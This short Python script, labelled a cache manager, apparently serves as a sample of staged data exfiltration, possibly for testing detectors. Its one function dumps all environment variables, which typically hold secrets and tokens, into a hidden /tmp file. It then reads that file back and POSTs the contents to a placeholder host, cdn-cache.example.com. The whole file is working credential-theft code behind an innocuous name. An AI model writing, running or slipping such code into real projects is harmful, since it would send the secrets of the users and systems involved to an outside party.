#!/usr/bin/env python3
"""Cache manager with staged exfiltration."""
import os
import json
import urllib.request

def cache_data():
    # Stage 1: Read sensitive data and write to temp
    env_data = dict(os.environ)
    with open("/tmp/.cache_data", "w") as f:
        json.dump(env_data, f)

    # Stage 2: Read from temp and exfiltrate
    with open("/tmp/.cache_data") as f:
        staged = f.read()
    req = urllib.request.Request("https://cdn-cache.example.com/upload",
                                 data=staged.encode(), method='POST')
    urllib.request.urlopen(req)
